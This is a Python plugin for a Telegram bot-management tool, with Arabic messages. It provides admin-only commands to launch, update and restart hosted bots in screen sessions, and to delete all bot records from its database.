# ▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂
# ▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂[𝗔.𝗠.𝗢.𝗥]▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂

@Client.on_message(filters.command("تشغيل البوتات", ""))
async def start_Allusers(c, message):
    if message.from_user.id not in [8182094446]:
        await message.reply_text("هذا الامر للمطور الأساسي فقط")
        return

    n = 0
    already_running = 0
    msg = await message.reply("جاري فحص وتشغيل جميع البوتات")
    await asyncio.sleep(2)
    await msg.delete()

    if not os.path.exists('Maked'):
        await message.reply_text("**~ خطأ: لا يوجد مجلد Maked.**")
        return
    active_sessions = subprocess.getoutput('screen -ls')

    for folder in os.listdir("Maked"):
        if re.search('[Bb][Oo][Tt]', folder):
            session_name = folder.replace("@", "")
            
            if f'.{session_name}\t(' in active_sessions:
                already_running += 1
                continue
                
            os.system(f'cd Maked/{folder} && screen -d -m -S {session_name} python3 -m Amor')
            n += 1

    response = []
    if n > 0:
        response.append(f"**تم تشغيل : {n} بوت بنجاح**")
    if already_running > 0:
        response.append(f"**كان هناك : {already_running} بوت يعمل مسبقاً**")
    
    if not response:
        await message.reply_text("**لا يوجد بوتات لتشغيلها**")
    else:
        await message.reply_text("\n".join(response))




@Client.on_message(filters.command("تحديث البوتات", "") & filters.private)
async def update_play_files(c, message):
    if message.from_user.id not in [8182094446]:
        await message.reply_text("هذا الأمر للمطور الأساسي فقط")
        return
    
    keyboard = InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton("تأكيد ✅", callback_data="confirm_updatebots"),
                InlineKeyboardButton("إلغاء ❌", callback_data="cancel_update")
            ]
        ]
    )
    
    await message.reply_text(
        "⚠️ هل أنت متأكد من أنك تريد تحديث جميع البوتات؟",
        reply_markup=keyboard
    )

@Client.on_callback_query(filters.regex("^confirm_updatebots$"))
async def confirm_updatebots(c, query):
    await query.message.edit("🔄 جاري تحديث ملفات التشغيل في جميع البوتات...")
    msg = query.message
    
    # المسار الصحيح للملفات المصدر
    source_path = os.path.join('Make', 'Amor', 'plugins', 'play')
    
    if not os.path.exists(source_path):
        await msg.edit(f"❌ خطأ: مجلد التشغيل غير موجود في المسار:\n{source_path}")
        return
    
    if not os.path.exists('Maked'):
        await msg.edit("❌ خطأ: مجلد البوتات (Maked) غير موجود")
        return
    
    bots_updated = 0
    failed_bots = []
    
    for bot_folder in os.listdir("Maked"):
        if re.search(r'[Bb][Oo][Tt]', bot_folder, re.IGNORECASE):
            bot_path = os.path.join('Maked', bot_folder)
            target_path = os.path.join(bot_path, 'Amor', 'plugins', 'play')
            
            try:
                # حذف المجلد القديم إذا كان موجوداً
                if os.path.exists(target_path):
                    shutil.rmtree(target_path)
                
                # إنشاء المسار إذا لم يكن موجوداً
                os.makedirs(os.path.dirname(target_path), exist_ok=True)
                
                # نسخ الملفات الجديدة
                shutil.copytree(source_path, target_path)
                
                # إعادة تشغيل البوت
                screen_name = bot_folder.replace("@", "").replace(".", "_")
                os.system(f'screen -XS {screen_name} quit')
                os.chdir(bot_path)
                os.system(f'screen -d -m -S {screen_name} python3 -m Amor')
                os.chdir("../..")
                
                bots_updated += 1
                await asyncio.sleep(1)
                
            except Exception as e:
                error_msg = f"حدث خطأ في بوت {bot_folder}: {str(e)}"
                print(error_msg)
                failed_bots.append(bot_folder)
                continue
    
    # إعداد رسالة النتيجة
    result_msg = f"✅ تم تحديث {bots_updated} بوت بنجاح"
    
    if failed_bots:
        result_msg += f"\n❌ فشل تحديث {len(failed_bots)} بوت:"
        for i, bot in enumerate(failed_bots[:5], 1):
            result_msg += f"\n{i}. @{bot}"
        if len(failed_bots) > 5:
            result_msg += f"\nو {len(failed_bots)-5} بوتات أخرى..."
    
    await msg.edit(result_msg)

@Client.on_callback_query(filters.regex("^cancel_update$"))
async def cancel_update(c, query):
    await query.message.edit("❌ تم إلغاء عملية التحديث")




    

@Client.on_message(filters.command("حذف البوتات", "") & filters.private)
async def delBots2(client, message):
    if message.from_user.id in [8182094446]:  
        keyboard = InlineKeyboardMarkup(
            [
                [InlineKeyboardButton("تأكيد الحذف", callback_data="confirm_delete")],
                [InlineKeyboardButton("إلغاء", callback_data="cancel_delete")]
            ]
        )

        await message.reply_text(
            "لتأكيد حذف جميع البوتات، اضغط على الزر أدناه:",
            reply_markup=keyboard
        )
    else:
        await message.reply_text("هذا الأمر للمطور الأساسي فقط")

@Client.on_callback_query(filters.regex("confirm_delete"))
async def confirm_delete(client, callback_query):
    bot_found = False

    for bot in Bots[:]: 
        Bots.remove(bot)
        xx = {"username": bot}
        db.delete_one(xx)
        bot_found = True

      

    if bot_found:
        await callback_query.message.edit_text("تم حذف جميع البوتات بنجاح ✅")
    else:
        await callback_query.message.edit_text("لم يتم العثور على بوتات لحذفها")

@Client.on_callback_query(filters.regex("cancel_delete"))
async def cancel_delete(client, callback_query):
    await callback_query.message.edit_text("تم إلغاء عملية الحذف ❌")
